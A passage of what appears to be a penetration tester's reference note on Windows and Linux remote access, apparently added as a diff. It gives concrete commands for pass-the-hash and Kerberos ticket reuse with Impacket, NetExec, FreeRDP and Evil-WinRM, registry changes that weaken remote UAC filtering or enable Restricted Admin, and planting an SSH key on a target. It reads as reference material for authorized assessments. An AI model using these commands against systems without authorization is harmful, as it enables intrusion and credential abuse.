permissions</td><td>Impacket, NetExec, CIM</td></tr><tr><td>Task Scheduler</td><td>RPC; transport depends on the client</td><td>one-shot or deferred command</td><td>password, NT hash, Kerberos</td><td>remote task creation and execution</td><td>Impacket <code>atexec</code>, <code>schtasks</code></td></tr></tbody></table></div>
+<p>The initial port does not always describe the complete path. <code>impacket-wmiexec</code>, for example, executes through WMI/DCOM but normally retrieves stdout over SMB. <code>impacket-atexec</code> uses Task Scheduler RPC over <code>\pipe\atsvc</code> and also uses <code>ADMIN$</code> to retrieve output.</p>
+<h2 id="authentication-material">Authentication material</h2>
+<h3 id="local-and-domain-accounts">Local and domain accounts</h3>
+<p>On Windows, distinguish a domain identity:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>CORP\analyst</span></span></code></pre>
+<p>from an account in the target’s local SAM:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>WIN01\Administrator</span></span></code></pre>
+<p>The same password or NT hash can produce different results depending on the account scope. Remote UAC can also filter the token of a local account that belongs to <code>Administrators</code>: authentication succeeds, but remote administrative operations return <code>ACCESS_DENIED</code>.</p>
+<p>With NetExec, <code>--local-auth</code> forces local authentication:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">nxc</span><span style="color:#A5D6FF"> smb</span><span style="color:#A5D6FF"> win01.corp.local</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#79C0FF">  -u</span><span style="color:#A5D6FF"> Administrator</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#79C0FF">  -p</span><span style="color:#A5D6FF"> '&#x3C;PASSWORD>'</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#79C0FF">  --local-auth</span></span></code></pre>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">nxc</span><span style="color:#A5D6FF"> smb</span><span style="color:#A5D6FF"> win01.corp.local</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#79C0FF">  -u</span><span style="color:#A5D6FF"> Administrator</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#79C0FF">  -H</span><span style="color:#FF7B72"> &#x3C;</span><span style="color:#A5D6FF">NTHAS</span><span style="color:#E6EDF3">H</span><span style="color:#FF7B72">></span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#79C0FF">  --local-auth</span></span></code></pre>
+<div><p><code>LocalAccountTokenFilterPolicy=0</code> keeps remote filtering for local administrative accounts. A value of <code>1</code> disables that filtering for affected connections.</p><p>Query the value from a session that can access the registry:</p><pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="cmd"><code><span class="line"><span style="color:#FF7B72">reg</span><span style="color:#FF7B72"> query</span><span style="color:#E6EDF3"> HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy</span></span></code></pre><p>If an operation calls for changing it:</p><pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="cmd"><code><span class="line"><span style="color:#FF7B72">reg</span><span style="color:#E6EDF3"> add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System </span><span style="color:#FF7B72">^</span></span>
+<span class="line"><span style="color:#E6EDF3">  /v LocalAccountTokenFilterPolicy </span><span style="color:#FF7B72">^</span></span>
+<span class="line"><span style="color:#E6EDF3">  /t REG_DWORD </span><span style="color:#FF7B72">^</span></span>
+<span class="line"><span style="color:#E6EDF3">  /d </span><span style="color:#79C0FF">1</span><span style="color:#FF7B72"> ^</span></span>
+<span class="line"><span style="color:#E6EDF3">  /f</span></span></code></pre><p>This changes target configuration and can affect several remote-administration paths at once.</p></div>
+<h3 id="passwords">Passwords</h3>
+<p>A password is the most portable authentication material in this Note. It can participate in SSH, RDP, WinRM, SMB/SCM, WMI/DCOM, and Task Scheduler when the service accepts the corresponding authentication method.</p>
+<p>A correct password only resolves authentication. RDP can deny logon, WinRM can reject session creation, and SMB can authenticate an account that cannot access the Service Control Manager.</p>
+<h3 id="nt-hashes">NT hashes</h3>
+<p>An NT hash can be reused by tools that implement NTLM authentication from hash material.</p>
+<p>Common uses include:</p>
+<ul>
+<li>SMB and SCM-backed execution.</li>
+<li>WMI/DCOM.</li>
+<li>Task Scheduler through compatible clients.</li>
+<li>WinRM with NTLM clients such as Evil-WinRM or NetExec.</li>
+<li>RDP when Restricted Admin is available.</li>
+</ul>
+<p>It is not a universal password replacement and does not provide SSH authentication.</p>
+<p>Impacket uses <code>-hashes</code>:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">impacket-psexec</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#79C0FF">  -hashes</span><span style="color:#A5D6FF"> ':&#x3C;NTHASH>'</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#A5D6FF">  'CORP.LOCAL/analyst@win01.corp.local'</span></span></code></pre>
+<p>NetExec accepts the NT hash directly:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">nxc</span><span style="color:#A5D6FF"> smb</span><span style="color:#A5D6FF"> win01.corp.local</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#79C0FF">  -u</span><span style="color:#A5D6FF"> analyst</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#79C0FF">  -d</span><span style="color:#A5D6FF"> CORP.LOCAL</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#79C0FF">  -H</span><span style="color:#FF7B72"> &#x3C;</span><span style="color:#A5D6FF">NTHAS</span><span style="color:#E6EDF3">H</span><span style="color:#FF7B72">></span></span></code></pre>
+<h3 id="kerberos-tickets-and-caches">Kerberos tickets and caches</h3>
+<p>Kerberos is service-oriented. A <strong>TGT</strong> can be used to request service tickets while it remains valid and the KDC is reachable. A <strong>TGS</strong> is already associated with a particular SPN, for example:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>cifs/win01.corp.local</span></span>
+<span class="line"><span>HTTP/win01.corp.local</span></span></code></pre>
+<p>On Linux, many offensive tools consume a credential cache through <code>KRB5CCNAME</code>:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FF7B72">export</span><span style="color:#E6EDF3"> KRB5CCNAME</span><span style="color:#FF7B72">=</span><span style="color:#A5D6FF">"</span><span style="color:#E6EDF3">$PWD</span><span style="color:#A5D6FF">/analyst.ccache"</span></span>
+<span class="line"><span style="color:#FFA657">klist</span></span></code></pre>
+<p>Impacket uses that cache with <code>-k</code>:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#E6EDF3">KRB5CCNAME</span><span style="color:#FF7B72">=</span><span style="color:#A5D6FF">"</span><span style="color:#E6EDF3">$PWD</span><span style="color:#A5D6FF">/analyst.ccache"</span><span style="color:#FFA657"> \</span></span>
+<span class="line"><span style="color:#E6EDF3">impacket-psexec </span><span style="color:#FF7B72">\</span></span>
+<span class="line"><span style="color:#79C0FF">  -k</span><span style="color:#79C0FF"> -no-pass</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#A5D6FF">  'CORP.LOCAL/analyst@win01.corp.local'</span></span></code></pre>
+<p>The same pattern works with <code>smbexec</code>, <code>wmiexec</code>, and <code>atexec</code>.</p>
+<h4 id="getting-a-tgt-from-linux">Getting a TGT from Linux</h4>
+<p>With a password:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">kinit</span><span style="color:#A5D6FF"> analyst@CORP.LOCAL</span></span>
+<span class="line"><span style="color:#FFA657">klist</span></span></code></pre>
+<p>With Impacket and a password:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">impacket-getTGT</span><span style="color:#A5D6FF"> 'CORP.LOCAL/analyst:&#x3C;PASSWORD>'</span></span>
+<span class="line"><span style="color:#FF7B72">export</span><span style="color:#E6EDF3"> KRB5CCNAME</span><span style="color:#FF7B72">=</span><span style="color:#A5D6FF">"</span><span style="color:#E6EDF3">$PWD</span><span style="color:#A5D6FF">/analyst.ccache"</span></span></code></pre>
+<p>With an NT hash:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">impacket-getTGT</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#79C0FF">  -hashes</span><span style="color:#A5D6FF"> ':&#x3C;NTHASH>'</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#A5D6FF">  'CORP.LOCAL/analyst'</span></span></code></pre>
+<p>With an AES key:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">impacket-getTGT</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#79C0FF">  -aesKey</span><span style="color:#FF7B72"> &#x3C;</span><span style="color:#A5D6FF">AES_KE</span><span style="color:#E6EDF3">Y</span><span style="color:#FF7B72">></span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#A5D6FF">  'CORP.LOCAL/analyst'</span></span></code></pre>
+<p>The generated file can then be selected with <code>KRB5CCNAME</code>.</p>
+<h4 id="realm-dns-spn-and-time">Realm, DNS, SPN, and time</h4>
+<p>A minimal configuration can be:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="ini"><code><span class="line"><span style="color:#FFA657">[libdefaults]</span></span>
+<span class="line"><span style="color:#FF7B72">  default_realm</span><span style="color:#E6EDF3"> = CORP.LOCAL</span></span>
+<span class="line"><span style="color:#FF7B72">  dns_lookup_kdc</span><span style="color:#E6EDF3"> = true</span></span>
+<span class="line"><span style="color:#FF7B72">  rdns</span><span style="color:#E6EDF3"> = false</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FFA657">[realms]</span></span>
+<span class="line"><span style="color:#FF7B72">  CORP.LOCAL</span><span style="color:#E6EDF3"> = {</span></span>
+<span class="line"><span style="color:#FF7B72">    kdc</span><span style="color:#E6EDF3"> = dc01.corp.local</span></span>
+<span class="line"><span style="color:#E6EDF3">  }</span></span></code></pre>
+<p>Requesting a specific SPN helps separate Kerberos problems from authorization failures:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">kvno</span><span style="color:#A5D6FF"> cifs/win01.corp.local</span></span>
+<span class="line"><span style="color:#FFA657">kvno</span><span style="color:#A5D6FF"> HTTP/win01.corp.local</span></span></code></pre>
+<p>For Kerberos, normally use the hostname or FQDN associated with the SPN instead of replacing it with an IP address.</p>
+<h3 id="ssh-keys-and-certificates">SSH keys and certificates</h3>
+<p>An SSH private key provides public-key authentication when the server trusts the corresponding public key:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">ssh</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#79C0FF">  -i</span><span style="color:#A5D6FF"> ./id_ed25519</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#79C0FF">  -o</span><span style="color:#A5D6FF"> IdentitiesOnly=yes</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#A5D6FF">  analyst@linux01.corp.local</span></span></code></pre>
+<p>An OpenSSH user certificate is different from an X.509 certificate. The server must trust the SSH CA that signed it and accept its principals and restrictions.</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">ssh</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#79C0FF">  -i</span><span style="color:#A5D6FF"> ./analyst_key</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#79C0FF">  -o</span><span style="color:#A5D6FF"> CertificateFile=./analyst_key-cert.pub</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#A5D6FF">  analyst@linux01.corp.local</span></span></code></pre>
+<h3 id="x509-certificates">X.509 certificates</h3>
+<p>An X.509 certificate is not a universal Windows remote credential.</p>
+<p>For direct WinRM certificate authentication, the server needs certificate authentication enabled and a <code>CertMapping</code> that maps the certificate to a <strong>local account</strong>.</p>
+<p>In Active Directory, a certificate can instead be used in other workflows to obtain Kerberos material. In that case SMB, WMI, or WinRM ultimately consumes Kerberos; those services are not directly accepting the certificate as a password or hash replacement.</p>
+<h2 id="ssh">SSH</h2>
+<h3 id="password">Password</h3>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">ssh</span><span style="color:#A5D6FF"> analyst@linux01.corp.local</span></span></code></pre>
+<h3 id="private-key">Private key</h3>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">chmod</span><span style="color:#79C0FF"> 600</span><span style="color:#A5D6FF"> ./id_ed25519</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FFA657">ssh</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#79C0FF">  -i</span><span style="color:#A5D6FF"> ./id_ed25519</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#79C0FF">  -o</span><span style="color:#A5D6FF"> IdentitiesOnly=yes</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#A5D6FF">  analyst@linux01.corp.local</span></span></code></pre>
+<p>A recovered key can still fail if it is encrypted, is not authorized for that account, has <code>from=</code> or <code>command=</code> restrictions, the server applies <code>ForceCommand</code>, or the account has no shell.</p>
+<h3 id="running-a-command">Running a command</h3>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">ssh</span><span style="color:#A5D6FF"> analyst@linux01.corp.local</span><span style="color:#A5D6FF"> 'id; hostname'</span></span></code></pre>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">ssh</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#79C0FF">  -i</span><span style="color:#A5D6FF"> ./id_ed25519</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#79C0FF">  -o</span><span style="color:#A5D6FF"> IdentitiesOnly=yes</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#A5D6FF">  analyst@linux01.corp.local</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#A5D6FF">  'id; hostname'</span></span></code></pre>
+<h3 id="adding-a-temporary-key">Adding a temporary key</h3>
+<p>Generate a dedicated key:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">ssh-keygen</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#79C0FF">  -t</span><span style="color:#A5D6FF"> ed25519</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#79C0FF">  -f</span><span style="color:#A5D6FF"> ./assessment_ed25519</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#79C0FF">  -C</span><span style="color:#A5D6FF"> 'assessment'</span></span></code></pre>
+<p>On the target:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">install</span><span style="color:#79C0FF"> -d</span><span style="color:#79C0FF"> -m</span><span style="color:#79C0FF"> 700</span><span style="color:#A5D6FF"> ~/.ssh</span></span>
+<span class="line"><span style="color:#FFA657">cat</span><span style="color:#A5D6FF"> /tmp/assessment_ed25519.pub</span><span style="color:#FF7B72"> >></span><span style="color:#A5D6FF"> ~/.ssh/authorized_keys</span></span>
+<span class="line"><span style="color:#FFA657">chmod</span><span style="color:#79C0FF"> 600</span><span style="color:#A5D6FF"> ~/.ssh/authorized_keys</span></span></code></pre>
+<p>Then:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">ssh</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#79C0FF">  -i</span><span style="color:#A5D6FF"> ./assessment_ed25519</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#79C0FF">  -o</span><span style="color:#A5D6FF"> IdentitiesOnly=yes</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#A5D6FF">  analyst@linux01.corp.local</span></span></code></pre>
+<p>Append to <code>authorized_keys</code>; overwriting it removes keys already configured for the user.</p>
+<h3 id="jump-hosts">Jump hosts</h3>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">ssh</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#79C0FF">  -J</span><span style="color:#A5D6FF"> operator@jump.corp.local</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#A5D6FF">  analyst@linux01.internal.corp.local</span></span></code></pre>
+<p>Multiple jumps:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">ssh</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#79C0FF">  -J</span><span style="color:#A5D6FF"> operator@jump1.corp.local,operator@jump2.corp.local</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#A5D6FF">  analyst@linux01.internal.corp.local</span></span></code></pre>
+<p><code>ProxyJump</code> solves connectivity to the target. Final SSH authentication still takes place against the last host.</p>
+<h2 id="rdp">RDP</h2>
+<h3 id="password-and-windows-credentials">Password and Windows credentials</h3>
+<div class="pub-tabs"><section class="pub-tab" data-tab-label="Windows"><pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="powershell"><code><span class="line"><span style="color:#79C0FF">mstsc.exe</span><span style="color:#FF7B72"> /</span><span style="color:#E6EDF3">v:win01.corp.local </span><span style="color:#FF7B72">/</span><span style="color:#E6EDF3">prompt</span></span></code></pre></section><section class="pub-tab" data-tab-label="Linux"><pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">xfreerdp</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#A5D6FF">  /v:win01.corp.local</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#A5D6FF">  /u:'CORP\analyst'</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#A5D6FF">  /dynamic-resolution</span></span></code></pre></section></div>
+<p>A valid account also needs the right to log on through Remote Desktop Services. An explicit deny overrides group membership that would otherwise grant access.</p>
+<h3 id="nt-hash-and-restricted-admin">NT hash and Restricted Admin</h3>
+<p>FreeRDP supports PtH through Restricted Admin:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">xfreerdp</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#A5D6FF">  /v:win01.corp.local</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#A5D6FF">  /u:Administrator</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#A5D6FF">  /pth:</span><span style="color:#FF7B72">&#x3C;</span><span style="color:#A5D6FF">NTHAS</span><span style="color:#E6EDF3">H</span><span style="color:#FF7B72">></span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#A5D6FF">  /dynamic-resolution</span></span></code></pre>
+<p>Restricted Admin requires administrative privileges on the target and support/configuration for the mode. <code>/pth</code> should not be treated as a generic RDP property.</p>
+<div><p>The state is controlled by <code>DisableRestrictedAdmin</code> under LSA.</p><p>Query:</p><pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="cmd"><code><span class="line"><span style="color:#FF7B72">reg</span><span style="color:#FF7B72"> query</span><span style="color:#E6EDF3"> HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin</span></span></code></pre><p>Enable Restricted Admin:</p><pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="cmd"><code><span class="line"><span style="color:#FF7B72">reg</span><span style="color:#E6EDF3"> add HKLM\SYSTEM\CurrentControlSet\Control\Lsa </span><span style="color:#FF7B72">^</span></span>
+<span class="line"><span style="color:#E6EDF3">  /v DisableRestrictedAdmin </span><span style="color:#FF7B72">^</span></span>
+<span class="line"><span style="color:#E6EDF3">  /t REG_DWORD </span><span style="color:#FF7B72">^</span></span>
+<span class="line"><span style="color:#E6EDF3">  /d </span><span style="color:#79C0FF">0</span><span style="color:#FF7B72"> ^</span></span>
+<span class="line"><span style="color:#E6EDF3">  /f</span></span></code></pre><p>This changes target configuration. It can be useful when another administrative path already exists and RDP PtH is wanted as an additional channel.</p></div>
+<h3 id="kerberos">Kerberos</h3>
+<p>A Windows client can use Kerberos within the user’s authentication context when the target name, SPN, and policy allow it.</p>
+<p>FreeRDP exposes Kerberos options, but using a Linux cache to produce an NLA/RDP session depends on the client, build, and delegation mode. This Note therefore does not document <code>ccache → RDP</code> as a universal operation.</p>
+<p>For field lookup, treat RDP Kerberos as a path to validate with the actual client and keep these as deterministic cases:</p>
+<ul>
+<li>Password or an existing Windows credential context.</li>
+<li>NT hash with Restricted Admin.</li>
+</ul>
+<h2 id="winrm-and-powershell-remoting">WinRM and PowerShell Remoting</h2>
+<p>WinRM listeners use these ports by default:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>5985/tcp  HTTP</span></span>
+<span class="line"><span>5986/tcp  HTTPS</span></span></code></pre>
+<p>PowerShell Remoting uses WinRM as the transport for PSRP. A reachable listener and valid credentials do not guarantee permission to create a session on the endpoint.</p>
+<h3 id="powershell-from-windows">PowerShell from Windows</h3>
+<p>Check the endpoint:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="powershell"><code><span class="line"><span style="color:#79C0FF">Test-WSMan</span><span style="color:#E6EDF3"> win01.corp.local</span></span></code></pre>
+<p>Interactive session:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="powershell"><code><span class="line"><span style="color:#E6EDF3">$cred </span><span style="color:#FF7B72">=</span><span style="color:#79C0FF"> Get-Credential</span><span style="color:#A5D6FF"> 'CORP\analyst'</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#79C0FF">Enter-PSSession</span><span style="color:#FF7B72"> `</span></span>
+<span class="line"><span style="color:#FF7B72">  -</span><span style="color:#E6EDF3">ComputerName win01.corp.local </span><span style="color:#FF7B72">`</span></span>
+<span class="line"><span style="color:#FF7B72">  -</span><span style="color:#E6EDF3">Credential $cred</span></span></code></pre>
+<p>Command execution:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="powershell"><code><span class="line"><span style="color:#79C0FF">Invoke-Command</span><span style="color:#FF7B72"> `</span></span>
+<span class="line"><span style="color:#FF7B72">  -</span><span style="color:#E6EDF3">ComputerName win01.corp.local </span><span style="color:#FF7B72">`</span></span>
+<span class="line"><span style="color:#FF7B72">  -</span><span style="color:#E6EDF3">Credential $cred </span><span style="color:#FF7B72">`</span></span>
+<span class="line"><span style="color:#FF7B72">  -</span><span style="color:#E6EDF3">ScriptBlock {</span></span>
+<span class="line"><span style="color:#E6EDF3">    whoami</span></span>
+<span class="line"><span style="color:#E6EDF3">    hostname</span></span>
+<span class="line"><span style="color:#E6EDF3">  }</span></span></code></pre>
+<p>Persistent session:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="powershell"><code><span class="line"><span style="color:#E6EDF3">$session </span><span style="color:#FF7B72">=</span><span style="color:#79C0FF"> New-PSSession</span><span style="color:#FF7B72"> `</span></span>
+<span class="line"><span style="color:#FF7B72">  -</span><span style="color:#E6EDF3">ComputerName win01.corp.local </span><span style="color:#FF7B72">`</span></span>
+<span class="line"><span style="color:#FF7B72">  -</span><span style="color:#E6EDF3">Credential $cred</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#79C0FF">Invoke-Command</span><span style="color:#FF7B72"> `</span></span>
+<span class="line"><span style="color:#FF7B72">  -</span><span style="color:#E6EDF3">Session $session </span><span style="color:#FF7B72">`</span></span>
+<span class="line"><span style="color:#FF7B72">  -</span><span style="color:#E6EDF3">ScriptBlock {</span></span>
+<span class="line"><span style="color:#E6EDF3">    whoami</span></span>
+<span class="line"><span style="color:#E6EDF3">    hostname</span></span>
+<span class="line"><span style="color:#E6EDF3">  }</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#79C0FF">Remove-PSSession</span><span style="color:#E6EDF3"> $session</span></span></code></pre>
+<p>With the current Kerberos context:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="powershell"><code><span class="line"><span style="color:#79C0FF">Enter-PSSession</span><span style="color:#FF7B72"> `</span></span>
+<span class="line"><span style="color:#FF7B72">  -</span><span style="color:#E6EDF3">ComputerName win01.corp.local </span><span style="color:#FF7B72">`</span></span>
+<span class="line"><span style="color:#FF7B72">  -</span><span style="color:#E6EDF3">Authentication Kerberos</span></span></code></pre>
+<p>Using an IP address prevents the normal PowerShell Remoting Kerberos path and commonly causes NTLM fallback or other configuration requirements.</p>
+<div><p>TCP/5985 uses HTTP as the transport, but that does not mean PowerShell commands and output are sent in cleartext. Kerberos and NTLM can provide message-level encryption after authentication.</p><p>HTTPS adds TLS transport protection. Basic authentication is a separate case because it does not provide that message protection on its own.</p></div>
+<h3 id="winrs">WinRS</h3>
+<p><code>winrs.exe</code> provides WinRM command execution from Windows:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="cmd"><code><span class="line"><span style="color:#FF7B72">winrs</span><span style="color:#E6EDF3"> /r:win01.corp.local </span><span style="color:#FF7B72">whoami</span></span></code></pre>
+<p>With an explicit user:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="cmd"><code><span class="line"><span style="color:#FF7B72">winrs</span><span style="color:#E6EDF3"> /r:win01.corp.local /u:CORP\analyst </span><span style="color:#FF7B72">whoami</span></span></code></pre>
+<p>HTTPS:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="cmd"><code><span class="line"><span style="color:#FF7B72">winrs</span><span style="color:#E6EDF3"> /r:win01.corp.local /usessl </span><span style="color:#FF7B72">whoami</span></span></code></pre>
+<h3 id="evil-winrm">Evil-WinRM</h3>
+<p>Password:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">evil-winrm</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#79C0FF">  -i</span><span style="color:#A5D6FF"> win01.corp.local</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#79C0FF">  -u</span><span style="color:#A5D6FF"> 'CORP\analyst'</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#79C0FF">  -p</span><span style="color:#A5D6FF"> '&#x3C;PASSWORD>'</span></span></code></pre>
+<p>NT hash:</p>
